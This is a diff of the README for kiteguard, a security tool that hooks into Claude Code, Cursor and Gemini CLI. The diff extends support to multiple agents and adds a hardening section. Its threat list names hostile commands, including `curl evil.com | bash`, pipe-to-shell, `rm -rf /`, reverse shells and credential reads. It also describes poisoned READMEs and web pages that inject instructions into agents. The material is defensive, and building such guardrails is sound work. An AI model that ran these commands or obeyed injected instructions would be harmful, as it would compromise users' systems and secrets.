@@ -1,9 +1,13 @@
 <p align="center">
-  <img src="docs/src/assets/kiteguard-logo-white.png" alt="kiteguard logo" width="180" />
+  <picture>
+    <source media="(prefers-color-scheme: dark)" srcset="docs/src/assets/kiteguard-logo-white.png" />
+    <source media="(prefers-color-scheme: light)" srcset="docs/src/assets/kiteguard-logo-black.png" />
+    <img src="docs/src/assets/kiteguard-logo-black.png" alt="kiteguard logo" width="180" />
+  </picture>
 </p>
 
 <p align="center">
-  <em>Runtime security guardrails for Claude Code and AI coding agents</em>
+  <em>Open-source runtime security guardrails for Claude Code, Cursor, and Gemini CLI</em>
 </p>
 
 <p align="center">
@@ -11,8 +15,10 @@
 </p>
 
 [![CI](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml/badge.svg)](https://github.com/DhivakaranRavi/kiteguard/actions/workflows/ci.yml)
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 ![Built with Rust](https://img.shields.io/badge/built%20with-Rust-orange.svg)
+![Tests](https://img.shields.io/badge/tests-190%20passing-brightgreen.svg)
+![Security](https://img.shields.io/badge/security-OWASP%20audited-green.svg)
 
 ---
 
@@ -29,7 +35,11 @@ git clone https://github.com/DhivakaranRavi/kiteguard.git
 cd kiteguard
 cargo build --release
 sudo install -m755 target/release/kiteguard /usr/local/bin/kiteguard
-kiteguard init
+
+# Register with your agent(s):
+kiteguard init --claude-code   # Claude Code
+kiteguard init --cursor        # Cursor
+kiteguard init --gemini        # Gemini CLI
 ```
 
 > No dependencies beyond a Rust toolchain. Get Rust at [rustup.rs](https://rustup.rs).
@@ -38,14 +48,14 @@ kiteguard init
 
 ## Why kiteguard
 
-Claude Code is an agent harness — it autonomously executes shell commands, reads your entire codebase, fetches external URLs, and modifies files without asking for confirmation. That power also means:
+AI coding agents — Claude Code, Cursor, and Gemini CLI — autonomously execute shell commands, read your entire codebase, fetch external URLs, and modify files without asking for confirmation. That power also means:
 
-- A poisoned README can instruct Claude to run `curl evil.com | bash`
-- A web page Claude fetches can contain embedded instructions
-- PII in files Claude reads goes straight to the Claude API
-- No security team has visibility into what developers are doing with Claude
+- A poisoned README can instruct the agent to run `curl evil.com | bash`
+- A web page the agent fetches can contain embedded instructions
+- PII in files the agent reads goes straight to the AI API
+- No security team has visibility into what developers are doing with AI agents
 
-kiteguard solves this by intercepting at **four critical points** in every Claude Code session — before damage happens.
+kiteguard solves this by intercepting at **critical points** in every agent session — before damage happens.
 
 ---
 
@@ -62,15 +72,15 @@ kiteguard solves this by intercepting at **four critical points** in every Claud
 
 | Threat | Hook |
 |---|---|
-| `curl \| bash`, `wget \| sh` pipe attacks | PreToolUse |
-| `rm -rf /`, reverse shells | PreToolUse |
-| Reads of `~/.ssh`, `.env`, credentials | PreToolUse |
+| `curl \| bash`, `wget \| sh` pipe attacks | PreToolUse / beforeShellExecution |
+| `rm -rf /`, `rm -rf ~`, reverse shells | PreToolUse / beforeShellExecution |
+| Reads of `~/.ssh`, `.env`, credentials | PreToolUse / beforeReadFile |
 | Writes to `/etc`, `.claude/settings.json` | PreToolUse |
-| SSRF to cloud metadata endpoints | PreToolUse |
-| Prompt injection in developer input | UserPromptSubmit |
-| PII (SSN, credit cards, emails) in prompts | UserPromptSubmit |
-| Injection embedded in files Claude reads | PostToolUse |
-| Secrets/API keys echoed in responses | Stop |
+| SSRF to cloud metadata endpoints | PreToolUse / beforeMCPExecution |
+| Prompt injection in developer input | UserPromptSubmit / beforeSubmitPrompt |
+| PII (SSN, credit cards, emails) in prompts | UserPromptSubmit / beforeSubmitPrompt |
+| Injection embedded in files agent reads | PostToolUse / afterShellExecution |
+| Secrets/API keys echoed in responses | Stop / afterAgentResponse |
 
 ---
 
@@ -103,7 +113,9 @@ Works with secure defaults. To customize for your org, create `~/.kiteguard/rule
 
 | Command | Description |
 |---|---|
-| `kiteguard init` | Register kiteguard hooks with Claude Code |
+| `kiteguard init --claude-code` | Register kiteguard hooks with Claude Code |
+| `kiteguard init --cursor` | Register kiteguard hooks with Cursor |
+| `kiteguard init --gemini` | Register kiteguard hooks with Gemini CLI |
 | `kiteguard serve [PORT]` | Launch the local security console (default: 7070) |
 | `kiteguard audit` | View the local audit log (all events) |
 | `kiteguard audit verify` | Verify audit log hash-chain integrity — detects tampering |
@@ -139,10 +151,10 @@ kiteguard serve 9090     # custom port
 | Column | Detail |
 |---|---|
 | TIMESTAMP | Local date + time |
-| HOOK | Which intercept point fired (UserPromptSubmit / PreToolUse / PostToolUse / Stop) |
+| HOOK | Which intercept point fired (UserPromptSubmit / PreToolUse / PostToolUse / Stop / beforeShellExecution / beforeReadFile / …) |
 | VERDICT | ✓ ALLOW (green) or ✕ BLOCK (red) |
 | REPO | Git repo the event came from |
-| USER | OS user running Claude Code |
+| USER | OS user running the agent |
 
 **Filter bar** — narrow the table by verdict (Block / Allow) or hook type. Filters reset pagination automatically.
 
@@ -180,10 +192,27 @@ See [docs/architecture.md](docs/architecture.md) for the full technical design.
 
 ---
 
+## Security
+
+kiteguard has been audited against the [OWASP Top 10](https://owasp.org/www-project-top-ten/). Key hardening measures:
+
+- **Fail-closed** — any internal error blocks the action (exit 2)
+- **Constant-time HMAC** — policy signature verification is timing-attack-safe
+- **No unsafe Rust** — zero `unsafe` blocks in the entire codebase
+- **Absolute binary paths** — `curl` resolved to `/usr/bin/curl` (no `$PATH` hijacking)
+- **Private temp files** — webhook payloads written to mode `0o600` temp files (not visible in `ps aux`)
+- **Audit log permissions** — `~/.kiteguard/audit.log` created with `0o600` at write time
+- **Bounded caches** — regex and glob caches are capped (512 / 256 entries) to prevent memory exhaustion
+- **Monotonic rate limiter** — uses `Instant` (not `SystemTime`) so clock skew can't bypass limits
+- **Multi-layer SSRF protection** — handles hex, octal, decimal, IPv4-mapped IPv6, and double-encoded URLs
+- **190 tests** — unit + integration tests run on Ubuntu and macOS in CI
+
+---
+
 ## Contributing
 
 See [CONTRIBUTING.md](CONTRIBUTING.md). Issues labeled `good first issue` are a great starting point.
 
 ## License
 
-MIT OR Apache-2.0
+MIT
